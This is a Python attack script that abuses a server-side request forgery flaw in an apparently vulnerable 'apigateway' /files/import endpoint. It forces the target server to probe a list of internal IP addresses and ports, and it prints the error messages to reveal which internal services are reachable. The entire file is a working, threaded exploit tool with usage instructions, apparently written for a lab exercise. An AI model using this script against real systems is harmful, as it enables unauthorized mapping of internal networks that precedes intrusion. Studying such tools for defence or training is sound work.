#!/usr/bin/python3
import sys, requests as r, json,time
from threading import Thread

portlist = [22,8000,8443,8055,42294,43264,5432,8000,8001,8443,9000,6379] ## This is regular one to speed up process.
#portlist = range(1,49152) ##This is range brute-forcing to define all services. (<- This one takes about 1 hour. to be honest, I used this one -_-)
iplist = ['172.16.16.1','172.16.16.2','172.16.16.3','172.16.16.4','172.16.16.5','172.16.16.6','localhost']

def sendreq(ip,portlist):
    for port in portlist:
        req = r.post("http://{}:{}/files/import".format(rhost,rport), json={"url":"http://{}:{}".format(ip,port)})
        if "ECONNREFUSED" not in req.text:
            resp_message = json.loads(req.text)['errors'][0]['message']
            print("[+] {}:{} - ".format(ip,port)+resp_message)
if __name__ == "__main__":
   if len(sys.argv) != 4:
       print("(+) usage: {} <RHOST> <RPORT> <THREADS>\n".format(sys.argv[0]))
       print("(+) RHOST - Remote server which runs vulnerable version of apigateway")
       print("(+) RPORT - Remote web-server port")
       print("(+) THREADS - Threads (recommended 15 for range brute-forcing, regular max 6.)\n")
       sys.exit(-1)
   rhost = sys.argv[1]
   rport = sys.argv[2]
   threadnum = int(sys.argv[3])
wpth = len(portlist) // threadnum
for ip in iplist:
    print("[+] Testing: {}".format(ip))
    for i in range(threadnum):
        start = i * wpth
        end = (i+1) * wpth
        t=Thread(target=sendreq, args=[ip,portlist[start:end]])
        t.start()
    t.join()
t.join()
t.join()
t.join()
t.join()
t.join()
